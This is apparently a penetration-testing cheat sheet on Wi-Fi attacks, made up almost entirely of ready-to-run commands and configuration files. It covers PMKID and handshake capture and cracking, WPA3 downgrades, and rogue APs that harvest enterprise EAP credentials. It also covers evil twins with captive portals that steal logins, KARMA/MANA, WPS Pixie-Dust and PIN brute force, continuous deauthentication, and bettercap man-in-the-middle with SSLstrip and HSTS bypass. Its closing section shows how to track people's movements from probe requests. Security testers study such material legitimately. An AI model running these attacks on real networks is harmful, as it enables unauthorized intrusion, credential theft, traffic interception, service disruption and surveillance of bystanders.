  <h1>Wi-Fi Attacks</h1>

  <h2>Overview</h2>
  <p>Wi-Fi attacks target IEEE 802.11 networks across the authentication, association, and data transmission phases. Modern enterprise deployments use WPA2-Enterprise (802.1X) or WPA3, but WPA2-PSK remains dominant in SMB and home environments. WPA3 introduced SAE (Simultaneous Authentication of Equals) which defeats offline dictionary attacks against the handshake — but transition-mode deployments and implementation flaws create exploitable paths. Understanding the current protocol landscape determines which attack techniques apply to a given target.</p>

  <h2>Environment Setup</h2>
  <pre><code># Place card in monitor mode:
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
# Or: airmon-ng start wlan0

# Kill processes that interfere with monitor mode:
airmon-ng check kill
# Kills NetworkManager, wpa_supplicant, dhclient

# Verify monitor mode and capabilities:
iw dev wlan0 info
iw phy phy0 info | grep -A10 "Supported interface modes"
iw phy phy0 info | grep -A20 "Band 1"  # 2.4 GHz channels
iw phy phy0 info | grep -A20 "Band 2"  # 5 GHz channels

# Channel-hop to survey target environment:
airodump-ng wlan0mon
# Output shows: BSSID, PWR, Beacons, Data, CH, MB, ENC, CIPHER, AUTH, ESSID
# ENC: WPA2/WPA3/WEP/OPN
# AUTH: PSK / MGT (enterprise 802.1X)
# CIPHER: CCMP (AES), TKIP (weak), GCMP (WPA3)

# Lock to specific AP for targeted capture:
airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan0mon

# Set TX power (if regulatory domain allows):
iw reg set BO  # Bolivia — often permits higher TX power in lab environments
iwconfig wlan0 txpower 30  # 30dBm (1W) — check local regulations</code></pre>

  <h2>PMKID Attack (Clientless WPA2/WPA3-PSK)</h2>
  <p>The PMKID attack (Jens Steube, 2018) allows capturing the PMKID from the AP's EAPOL frame 1/4 without needing a client to be present. The PMKID is derived from the PMK (the PSK), allowing offline dictionary/brute-force attacks. No deauth is required — entirely passive toward users.</p>
  <pre><code># hcxdumptool — capture PMKID and EAPOL from APs:
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
# Sends Probe Request + Authentication to all detected APs
# AP responds with EAPOL frame 1 containing PMKID (if supported)

# Target specific AP:
echo "AABBCCDDEEFF" > target.txt  # BSSID without colons
hcxdumptool -i wlan0mon -o capture.pcapng --filterlist_ap=target.txt --filtermode=2

# Filter capture to PMKID only:
hcxdumptool -i wlan0mon -o capture.pcapng --only_sta   # Only station-side
# Or use --enable_status=3 for verbose

# Convert capture to hashcat format:
hcxpcapngtool -o hashes.hc22000 capture.pcapng
# Format 22000 = unified PMKID + EAPOL hash format

# Crack with hashcat (mode 22000):
hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt -r rules/best64.rule
hashcat -m 22000 hashes.hc22000 -a 3 ?u?l?l?l?d?d?d?d  # Mask attack

# PMKID availability — not all APs respond with PMKID:
# Supported: many consumer routers (TP-Link, Netgear, Asus, most Broadcom chipsets)
# Not supported: Cisco enterprise APs, many WPA3-only deployments
# Note: WPA3-SAE PMKIDs are cryptographically different — cannot be cracked the same way</code></pre>

  <h2>WPA2 4-Way Handshake Capture + Cracking</h2>
  <p>Classic WPA2 attack: capture the 4-way handshake when a client authenticates, then brute-force the PSK offline. The handshake contains enough information to verify PSK guesses without any further network interaction.</p>
  <pre><code># Passive capture — wait for clients to connect or roam:
airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w handshake wlan0mon
# Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" in top-right

# Active: deauthenticate a client to force re-authentication:
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon
# -a = AP BSSID, -c = client MAC
# Client reconnects → handshake captured in airodump-ng session

# Broadcast deauth (affects all clients — louder, use targeted if possible):
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Verify handshake captured:
aircrack-ng handshake-01.cap
# Should show: "1 handshake" next to target SSID

# Crack with aircrack-ng:
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap

# Convert to hashcat format (hashcat is ~100x faster):
hcxpcapngtool -o hashes.hc22000 handshake-01.cap
# Or: cap2hccapx handshake-01.cap handshake.hccapx
hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt -r rules/OneRuleToRuleThemAll.rule

# WPA2 cracking rates (approximate, depends on GPU):
# GTX 1080 Ti: ~600k-1M PMK/s
# RTX 4090:    ~3-5M PMK/s
# Cloud GPU (A100 x8): ~25-30M PMK/s

# Rule-based attacks are typically more effective than pure dictionary for PSKs:
hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/d3ad0ne.rule \
  -r /usr/share/hashcat/rules/best64.rule

# Wordlist generation from OSINT (company name, address, phone):
# cewl https://target.com -d 2 -m 5 -w custom.txt
# Add target-specific variations: CompanyName2024!, Address#1 etc.</code></pre>

  <h2>WPA3 Dragonblood Attacks</h2>
  <p>WPA3-Personal uses SAE (Simultaneous Authentication of Equals / Dragonfly), which provides forward secrecy and is resistant to offline dictionary attacks. However, implementation vulnerabilities (Dragonblood, 2019) allow side-channel attacks against SAE. Many patches exist, but older routers remain unpatched, and WPA3 Transition Mode (mixed WPA2/WPA3) weakens the security to WPA2 levels.</p>
  <pre><code># Check if AP supports WPA3:
airodump-ng wlan0mon | grep "WPA3\|SAE\|GCMP"
# Or scan with: iw dev wlan0 scan | grep -A5 "SSID:"

# WPA3 Transition Mode downgrade attack:
# Many WPA3 deployments run "WPA3 Transition Mode" = accepts both WPA2 and WPA3 clients
# Attack: connect as WPA2 client → use standard WPA2 PMKID or handshake attack
# The WPA2 BSS (same or different BSSID) accepts WPA2 connections → hash is crackable

# Check for transition mode:
airodump-ng wlan0mon
# If same SSID shows both WPA2 and WPA3 in ENC column → transition mode

# Dragonblood — SAE side-channel (CVE-2019-9494, CVE-2019-9496):
# REQUIRES: unpatched router firmware (pre-mid-2019)
# The SAE Commit frame response timing leaks information about the password element
# Allows distinguishing password candidates with ~22 authentication attempts per bit

# Tool: dragonslayer (proof-of-concept by Dragonblood researchers):
# https://github.com/vanhoefm/dragonslayer
# Setup requires a compatible Wi-Fi card and specific kernel patches
# Practical against routers that never received the 2019 SAE patch

# SAE confirmation bypass (CVE-2019-9496):
# Sending a malformed SAE Confirm before Commit causes some APs to transition state
# Can trigger DoS or force WPA2 fallback depending on implementation

# WPA3 Enterprise — GCMP-256 requires different cracking approach:
# WPA3 enterprise still uses 802.1X → focus on EAP credential capture (see below)
# The encryption is stronger but auth is still EAP-based and attackable at that layer</code></pre>

  <h2>WPA2-Enterprise (802.1X) — EAP Credential Harvesting</h2>
  <p>WPA2-Enterprise uses 802.1X authentication with EAP. The most common EAP types in enterprise are PEAP-MSCHAPv2 and EAP-TTLS. A rogue AP configured with hostapd-wpe or eaphammer can harvest MSCHAPv2 challenge/response pairs from clients that connect, which are then crackable offline via asleap or hashcat.</p>
  <pre><code># ── Rogue AP with hostapd-wpe (WPE = Wireless Pwnage Edition) ──
# hostapd-wpe mimics the target enterprise AP, captures EAP credentials

# Install:
apt install hostapd-wpe

# Configure hostapd-wpe.conf:
cat > /etc/hostapd-wpe/hostapd-wpe.conf &lt;&lt;'EOF'
interface=wlan0
driver=nl80211
ssid=CorpWiFi              # Match target SSID exactly
channel=6
hw_mode=g
ieee8021x=1
eapol_version=2
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=
dh_file=/etc/hostapd-wpe/certs/dh
eap_fast_a_id=101112131415161718191a1b1c1d1e1f
eap_fast_a_id_info=hostapd-wpe
EOF

# Start rogue AP:
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Captured credentials appear in:
cat /etc/hostapd-wpe/hostapd-wpe.log
# Format: username | challenge | response (MSCHAPv2 NTHash challenge)

# ── eaphammer — more modern tooling ────────────────────────────
git clone https://github.com/s0lst1c3/eaphammer
cd eaphammer
python eaphammer --cert-wizard          # Generate evil twin cert
python eaphammer -i wlan0 \
  --channel 6 \
  --auth wpa-eap \
  --essid CorpWiFi \
  --creds                               # Harvest credentials mode

# eaphammer also supports:
python eaphammer -i wlan0 --essid CorpWiFi --auth wpa-eap \
  --hostile-portal                      # Capture plaintext creds via hostile portal

# ── Crack captured MSCHAPv2 ────────────────────────────────────
# asleap — specialized MSCHAPv2 cracker:
asleap -C CHALLENGE_HEX -R RESPONSE_HEX -W /usr/share/wordlists/rockyou.txt

# hashcat (mode 5500 = NTLMv1 / MSCHAPv2):
# Format: username:::challenge:response:response
hashcat -m 5500 mschapv2.hash /usr/share/wordlists/rockyou.txt
# MSCHAPv2 NT hash cracking rate: ~10-50B/s on modern GPU (much faster than WPA2)

# ── Client validation bypass (why this works) ──────────────────
# Clients should validate the server certificate before sending credentials
# Reality: many enterprise deployments have "Accept any certificate" configured
# Users click through certificate warnings (especially on first connection)
# Devices with no screen (printers, IoT) can't validate certificates → auto-connect

# Force client to connect to rogue AP:
# Option 1: Deauth from real AP, client roams to strongest signal (your rogue AP)
# Option 2: Boost TX power / use directional antenna to overpower real AP
# Option 3: Evil twin on same channel → clients may prefer stronger RSSI</code></pre>

  <h2>Evil Twin / Rogue AP Attack</h2>
  <p>A rogue AP with the same SSID as the target tricks clients into connecting. Combined with a captive portal, this captures credentials typed by users. Combined with DHCP and DNS spoofing, it enables full network MITM.</p>
  <pre><code># ── bettercap Evil Twin ─────────────────────────────────────────
bettercap -iface wlan0

# In bettercap interactive console:
wifi.recon on
wifi.show                              # List detected APs
wifi.ap target.essid AA:BB:CC:DD:EE:FF wlan0   # Create evil twin

# Full evil twin with captive portal (airgeddon):
git clone https://github.com/v1s1t0r1sh3r3/airgeddon
cd airgeddon
bash airgeddon.sh
# Menu: Evil Twin attack → Captive portal → select interface → SSID
# airgeddon handles: hostapd config, DHCP (dnsmasq), DNS spoofing, captive portal

# ── Manual evil twin setup ──────────────────────────────────────
# 1. Create AP with hostapd:
cat > /tmp/hostapd.conf &lt;&lt;'EOF'
interface=wlan0
driver=nl80211
ssid=TargetNetwork
channel=6
hw_mode=g
EOF
hostapd /tmp/hostapd.conf &

# 2. Assign IP to interface:
ip addr add 10.0.0.1/24 dev wlan0
ip link set wlan0 up

# 3. DHCP server (dnsmasq):
cat > /tmp/dnsmasq.conf &lt;&lt;'EOF'
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1    # Redirect all DNS to captive portal
EOF
dnsmasq -C /tmp/dnsmasq.conf

# 4. IP forwarding + NAT (optional — provide internet access to reduce suspicion):
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# 5. Captive portal (simple Flask):
# Serve a credential-harvesting page on 10.0.0.1:80
# Mimic target org's VPN login / WiFi login page

# Deauth real AP to force client reconnection:
aireplay-ng --deauth 0 -a REAL_AP_BSSID wlan0mon  # Continuous deauth
# Client disconnects from real AP, connects to your evil twin (stronger RSSI)</code></pre>

  <h2>KARMA Attack</h2>
  <p>The KARMA attack exploits the 802.11 probe request mechanism. Devices send probe requests for networks in their preferred network list (PNL). A KARMA-enabled AP responds to all probe requests, claiming to be whatever network the device is looking for. Updated variant: MANA (from Sensepost) adds smarter targeting.</p>
  <pre><code># KARMA exploits probe requests from clients:
# Client sends: "Anyone out there named 'HomeNetwork'?"
# KARMA AP responds: "Yes, I am HomeNetwork!"
# Client auto-connects

# hostapd-mana (KARMA + improvements):
apt install hostapd-mana

cat > /tmp/hostapd-mana.conf &lt;&lt;'EOF'
interface=wlan0
driver=nl80211
hw_mode=g
channel=6
ssid=KARMA
mana_wpe=1               # Enable EAP credential capture
mana_credout=/tmp/creds.txt
mana_eapsuccess=1        # Send fake EAP success
mana_eaptls=0
# KARMA configuration:
mana_loud=1              # Respond to all probe requests with the probed SSID
EOF
hostapd-mana /tmp/hostapd-mana.conf

# Logging connected clients and probes:
tail -f /tmp/creds.txt
# Captures: SSID client was looking for, their MAC, EAP credentials (if enterprise)

# Modern KARMA limitations:
# - iOS (since ~2017), Android (since ~2019): random MACs for probe requests
# - Mac randomization: probe requests use random MACs → harder to track / target
# - WPA3-only networks: clients won't connect to open/WPA2 KARMA AP for WPA3 networks
# - "Known Networks" list has shrunk — modern OS stops probing for most old networks

# MANA improvements over KARMA:
# - Loud mode: responds to all probes (classic KARMA)
# - Loud with SSID list: only respond to specific target SSIDs
# - Smooth mode: track what SSIDs each MAC probes for, respond consistently
# - Enables targeted attacks on specific devices/users

# Capture probe requests to build SSID list:
airodump-ng wlan0mon --output-format csv -w probes &amp;
# In the CSV output, "Probed ESSIDs" column shows what each device is looking for
awk -F, 'NF>14 &#123;print $7, $NF&#125;' probes-01.csv | sort -u</code></pre>

  <h2>WPS Attacks</h2>
  <p>Wi-Fi Protected Setup (WPS) remains enabled by default on many consumer routers. The PIN method has a design flaw: the 8-digit PIN is verified in two 4-digit halves, reducing brute-force complexity to 11,000 attempts. Pixie-Dust attacks exploit weak pseudo-random number generation in some router implementations.</p>
  <pre><code># Scan for WPS-enabled APs:
wash -i wlan0mon
# Output: BSSID, CH, RSSI, WPS Version, WPS Locked, ESSID
# "WPS Locked" = Yes means the AP has locked WPS after too many attempts

# Pixie-Dust attack (offline — exploits weak PRNG):
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vvv
# -K 1 = pixie-dust mode
# Vulnerable: older Realtek, Ralink, Broadcom implementations
# Returns PSK and WPS PIN in seconds if vulnerable
# Not patchable without firmware update; many ISP routers still vulnerable

# PIN brute-force (online — ~4 hours for full scan if AP doesn't lock):
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vvv
# Add delay to avoid WPS lockout:
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d 5 -r 3:15 -vvv
# -d 5 = 5s delay between attempts, -r 3:15 = wait 15s every 3 attempts

# Bully — alternative to reaver with better lockout handling:
bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3

# Check specific AP WPS vulnerability:
# Manufacturers commonly vulnerable to Pixie-Dust (check firmware dates):
# TP-Link (pre-2015 firmware), D-Link (multiple models), Belkin, ZTE, many ISP routers

# WPS PIN recovery after Pixie-Dust:
# If Pixie-Dust reveals the PIN → use it for persistent access even if PSK changes
# Pin is static and doesn't change with PSK rotation</code></pre>

  <h2>802.11r Fast Transition (FT) Attacks</h2>
  <p>802.11r (Fast BSS Transition) enables rapid roaming between APs. A flaw in the FT authentication protocol allows an unauthenticated attacker to trigger a buffer overflow or bypass authentication on vulnerable implementations.</p>
  <pre><code># CVE-2017-13082 (KRACK + FT): FT Reassociation Request replay
# Allows replaying/forcing reinstallation of FT PTK → nonce reuse → decrypt packets

# Check if target uses 802.11r:
iw dev wlan0 scan | grep -i "FT\|Fast Transition\|MDIE"
# MDIE = Mobility Domain IE — indicator of 802.11r deployment

# 802.11r FT SAE downgrade (WPA3 transition mode + FT):
# FT with SAE (FT-SAE) in transition mode can be downgraded to FT-PSK
# Client connects via FT-PSK → captures standard 4-way handshake material

# FragAttacks (2021) — 802.11 frame fragmentation vulnerabilities:
# CVE-2020-26140, CVE-2020-26143, CVE-2020-26145
# Still unpatched on older firmware/IoT devices
# Allows injecting arbitrary frames, potentially bypassing WPA2 encryption
# fragtool — inject fragmented frames to test FragAttack vulnerabilities:
# https://github.com/vanhoefm/fragattacks

# KRACK (Key Reinstallation Attack) — still relevant for IoT/embedded:
# CVE-2017-13077 through CVE-2017-13086
# WPA2 4-way handshake nonce reinstallation
# Most modern OS patched, but: embedded systems, IoT, older Android (pre-6.0), Linux
# wpa_supplicant &lt; 2.7 vulnerable — check firmware dates on target devices
# Test: krack-test-client.py from https://github.com/vanhoefm/krackattacks-scripts</code></pre>

  <h2>Wireless MITM with bettercap</h2>
  <p>After connecting a target to your rogue AP, bettercap provides full MITM capabilities: ARP spoofing, DNS spoofing, HTTP/HTTPS interception, and credential harvesting.</p>
  <pre><code># bettercap — full wireless MITM framework:
bettercap -iface wlan0

# In bettercap console (once clients are connected to your AP):
net.probe on                           # Discover connected clients
net.show                               # List clients with IPs

# ARP poisoning (MITM traffic):
set arp.spoof.targets 10.0.0.50        # Target specific client
arp.spoof on

# DNS spoofing:
set dns.spoof.domains *.microsoft.com,*.google.com
set dns.spoof.address 10.0.0.1
dns.spoof on

# HTTP/HTTPS credential capture:
set https.proxy.sslstrip true          # SSLstrip for HTTP downgrade
https.proxy on
http.proxy on

# Caplets for common attack workflows:
bettercap -iface wlan0 -caplet wifi-ap  # Start AP and run MITM automatically

# Log credentials:
set http.proxy.script /usr/share/bettercap/caplets/credentials.js
events.stream on                       # Watch events including captured creds

# HSTS bypass (modern sites resist SSLstrip):
# Use: bettercap's hstshijack caplet — modifies hostnames slightly to bypass HSTS
# e.g., transforms "accounts.google.com" → "accountss.google.com" (typosquatting)
set hstshijack.targets google.com,facebook.com,twitter.com
hstshijack on</code></pre>

  <h2>Wireless Reconnaissance — Probe Harvesting and MAC Tracking</h2>
  <pre><code># Passive probe request capture (track where people have been):
airodump-ng wlan0mon --output-format csv -w probes --write-interval 5
# "Probed ESSIDs" field lists SSIDs the device has previously connected to
# Reveals: home network name, workplace, hotel chains, coffee shops

# Note: modern devices randomize probe request MACs (iOS, Android, Windows 10+)
# Randomized MACs use locally administered bit — check:
# If 2nd hex digit is 2,6,A,E → locally administered (random MAC)

# Kismet — comprehensive passive wireless scanner with logging:
kismet --no-ncurses -c wlan0:name=monitor0
# Web UI at http://localhost:2501
# Stores all observed clients, APs, probe requests in SQLite DB

# wigle.net — check if captured SSIDs have known locations:
# Query API with captured SSID → may return GPS coordinates of AP
# wigle-wifi-wardriving app or API: https://api.wigle.net/swagger

# Fingerprint APs by beacon characteristics:
# Vendor OUI (first 3 bytes of BSSID): lookup at https://macvendors.com/
# Beacon interval, supported rates, IE ordering — vendor fingerprinting
# Useful for: identifying AP model → check for known vulnerabilities

# 802.11 timing analysis:
# Measure inter-beacon interval jitter — clock skew can uniquely identify specific AP hardware
# Useful for tracking APs that change their MAC (rare but happens in some enterprise configs)</code></pre>

